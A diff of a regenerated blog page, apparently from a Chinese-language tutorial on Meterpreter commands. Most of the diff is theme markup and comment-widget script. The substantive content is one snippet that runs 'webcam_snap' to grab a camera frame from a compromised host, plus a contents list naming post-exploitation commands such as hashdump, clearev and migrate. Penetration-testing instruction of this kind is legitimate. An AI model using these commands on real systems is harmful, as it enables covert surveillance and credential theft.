-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_snap -i 1 -v false</span><br><span class="line">[*] Starting...</span><br><span class="line">[+] Got frame</span><br><span class="line">[*] Stopped</span><br><span class="line">Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_snap -i 1 -v false</span><br><span class="line">[*] Starting...</span><br><span class="line">[+] Got frame</span><br><span class="line">[*] Stopped</span><br><span class="line">Webcam shot saved to: &#x2F;root&#x2F;Offsec&#x2F;YxdhwpeQ.jpeg</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
     </div>
 
     
     
     
-        
-      
 
       <footer class="post-footer">
-          
-            
-          
           <div class="post-tags">
-            
               <a href="/tags/meterpreter/" rel="tag"># meterpreter</a>
-            
               <a href="/tags/Penetration/" rel="tag"># Penetration</a>
-            
           </div>
-        
 
         
 
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-              
-                <a href="/2019/12/28/pwn_tips/" rel="next" title="pwn tips in gdb">
-                  <i class="fa fa-chevron-left"></i> pwn tips in gdb
-                </a>
-              
-            </div>
 
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/12/30/kksctf-writeup/" rel="prev" title="kksctf writeup">
-                  kksctf writeup <i class="fa fa-chevron-right"></i>
-                </a>
-              
-            </div>
-          </div>
         
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/12/28/pwn_tips/" rel="prev" title="pwn tips in gdb">
+      <i class="fa fa-chevron-left"></i> pwn tips in gdb
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/12/30/kksctf-writeup/" rel="next" title="kksctf writeup">
+      kksctf writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
       </footer>
     
   </article>
@@ -510,14 +424,33 @@
   
   
 
-  </div>
 
 
           </div>
           
-    
-    <div class="comments" id="comments"></div>
-  
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
 
         </div>
           
@@ -530,11 +463,6 @@
 
   <aside class="sidebar">
     <div class="sidebar-inner">
-        
-        
-        
-        
-      
 
       <ul class="sidebar-nav motion-element">
         <li class="sidebar-nav-toc">
@@ -547,120 +475,67 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#METERPRETER命令用法"><span class="nav-text">METERPRETER命令用法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HELP"><span class="nav-text">HELP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BACKGROUND"><span class="nav-text">BACKGROUND</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CAT"><span class="nav-text">CAT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CD-AND-PWD"><span class="nav-text">CD AND PWD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CLEAREV"><span class="nav-text">CLEAREV</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CLEAREV-1"><span class="nav-text">CLEAREV</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOWNLOAD"><span class="nav-text">DOWNLOAD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EDIT"><span class="nav-text">EDIT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXECUTE"><span class="nav-text">EXECUTE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GETUID"><span class="nav-text">GETUID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HASHDUMP"><span class="nav-text">HASHDUMP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDLETIME"><span class="nav-text">IDLETIME</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IPCONFIG"><span class="nav-text">IPCONFIG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LPWD-AND-LCD"><span class="nav-text">LPWD AND LCD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LS"><span class="nav-text">LS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MIGRATE"><span class="nav-text">MIGRATE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PS"><span class="nav-text">PS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RESOURCE"><span class="nav-text">RESOURCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SEARCH"><span class="nav-text">SEARCH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SHELL"><span class="nav-text">SHELL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UPLOAD"><span class="nav-text">UPLOAD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEBCAM-LIST"><span class="nav-text">WEBCAM_LIST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEBCAM-SNAP"><span class="nav-text">WEBCAM_SNAP</span></a></li></ol></div>
-        
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#METERPRETER%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95"><span class="nav-text">METERPRETER命令用法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HELP"><span class="nav-text">HELP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BACKGROUND"><span class="nav-text">BACKGROUND</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CAT"><span class="nav-text">CAT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CD-AND-PWD"><span class="nav-text">CD AND PWD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CLEAREV"><span class="nav-text">CLEAREV</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CLEAREV-1"><span class="nav-text">CLEAREV</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOWNLOAD"><span class="nav-text">DOWNLOAD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EDIT"><span class="nav-text">EDIT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXECUTE"><span class="nav-text">EXECUTE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GETUID"><span class="nav-text">GETUID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HASHDUMP"><span class="nav-text">HASHDUMP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDLETIME"><span class="nav-text">IDLETIME</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IPCONFIG"><span class="nav-text">IPCONFIG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LPWD-AND-LCD"><span class="nav-text">LPWD AND LCD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LS"><span class="nav-text">LS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MIGRATE"><span class="nav-text">MIGRATE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PS"><span class="nav-text">PS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RESOURCE"><span class="nav-text">RESOURCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SEARCH"><span class="nav-text">SEARCH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SHELL"><span class="nav-text">SHELL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UPLOAD"><span class="nav-text">UPLOAD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEBCAM-LIST"><span class="nav-text">WEBCAM_LIST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEBCAM-SNAP"><span class="nav-text">WEBCAM_SNAP</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image"
-      src="/images/avatar.gif"
-      alt="Demen Lee">
+    <img class="site-author-image" itemprop="image" alt="Demen Lee"
+      src="/images/avatar.gif">
   <p class="site-author-name" itemprop="name">Demen Lee</p>
   <div class="site-description" itemprop="description">Sharing, Communicating more, then moving on......</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-        
           <a href="/archives/">
         
           <span class="site-state-item-count">32</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
-    
-      
-      
       <div class="site-state-item site-state-categories">
-        
-          
             <a href="/categories/">
           
-        
         <span class="site-state-item-count">10</span>
-        <span class="site-state-item-name">categories</span>
-        </a>
+        <span class="site-state-item-name">categories</span></a>
       </div>
-    
-      
-      
       <div class="site-state-item site-state-tags">
-        
-          
             <a href="/tags/">
           
-        
         <span class="site-state-item-count">33</span>
-        <span class="site-state-item-name">tags</span>
-        </a>
+        <span class="site-state-item-name">tags</span></a>
       </div>
-    
   </nav>
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://github.com/spwpun" title="GitHub &rarr; https://github.com/spwpun" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+        <a href="https://github.com/spwpun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;spwpun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
-    
       <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="mailto:spwpun@gmail.com" title="E-Mail &rarr; mailto:spwpun@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+        <a href="mailto:spwpun@gmail.com" title="E-Mail → mailto:spwpun@gmail.com" rel="noopener" target="_blank"><i class="fab fa-envelope fa-fw"></i>E-Mail</a>
       </span>
-    
       <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://weibo.com/u/5536839794" title="Weibo &rarr; https://weibo.com/u/5536839794" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+        <a href="https://weibo.com/u/5536839794" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5536839794" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
       </span>
-    
       <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://music.163.com/#/user/home?id=127070793" title="Netease &rarr; https://music.163.com/#/user/home?id=127070793" rel="noopener" target="_blank"><i class="fa fa-fw fa-netease"></i>Netease</a>
+        <a href="https://music.163.com/#/user/home?id=127070793" title="Netease → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;127070793" rel="noopener" target="_blank"><i class="fab fa-instagram fa-fw"></i>Netease</a>
       </span>
-    
   </div>
 
 
   <div class="links-of-blogroll motion-element">
-    <div class="links-of-blogroll-title">
-      <i class="fa fa-fw fa-link"></i>
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
       Links
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="https://whale3070.github.io" title="https://whale3070.github.io" rel="noopener" target="_blank">Whale3070</a>
+          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io" rel="noopener" target="_blank">Whale3070</a>
         </li>
-      
         <li class="links-of-blogroll-item">
-          <a href="https://eternalhikari.github.io" title="https://eternalhikari.github.io" rel="noopener" target="_blank">Hikari</a>
+          <a href="https://eternalhikari.github.io/" title="https:&#x2F;&#x2F;eternalhikari.github.io" rel="noopener" target="_blank">Hikari</a>
         </li>
-      
     </ul>
   </div>
 
@@ -674,17 +549,23 @@
       </div>
     </main>
 
-    <footer id="footer" class="footer">
+    <footer class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-flag-checkered"></i>
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="flag-checkered"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Spwpun</span>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a></div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a></div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
 
         
 <div class="busuanzi-count">
@@ -697,9 +578,7 @@
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
-  
     <span class="post-meta-divider">|</span>
-  
     <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
@@ -708,7 +587,6 @@
         <span id="busuanzi_value_site_pv"></span>
       </span>
     </span>
-  
 </div>
 
 
@@ -718,51 +596,47 @@
 
 
 
-
-
-
-
-        
       </div>
     </footer>
   </div>
 
   
-  <script src="/lib/anime.min.js?v=3.1.0"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
-<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/js/next-boot.js?v=7.4.1"></script>
+<script src="/js/utils.js"></script>
 
-
-
-  
+<script src="/js/motion.js"></script>
 
 
+<script src="/js/schemes/pisces.js"></script>
 
 
-
-
-
-
-  <script src="/js/local-search.js?v=7.4.1"></script>
-
-
-
-
-
-
-
-
-
-
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
 
   
 
@@ -770,29 +644,31 @@
 
 
 <script>
-NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
-  var GUEST = ['nick', 'mail', 'link'];
-  var guest = 'nick,mail,link';
-  guest = guest.split(',').filter(item => {
-    return GUEST.includes(item);
-  });
-  new Valine({
-    el: '#comments',
-    verify: true,
-    notify: false,
-    appId: 'O9n8UnYXJ5M4s4QEumwRCwH9-gzGzoHsz',
-    appKey: 'qdSjFo9LUO20Ba6XRPMQGX7v',
-    placeholder: 'Leave something interesting......',
-    avatar: 'mm',
-    meta: guest,
-    pageSize: '10' || 10,
-    visitor: true,
-    lang: '' || 'zh-cn',
-    path: location.pathname,
-    recordIP: false,
-    serverURLs: ''
-  });
-}, window.Valine);
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : true,
+      notify     : false,
+      appId      : 'O9n8UnYXJ5M4s4QEumwRCwH9-gzGzoHsz',
+      appKey     : 'qdSjFo9LUO20Ba6XRPMQGX7v',
+      placeholder: "Leave something interesting......",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
 </script>
 
 </body>
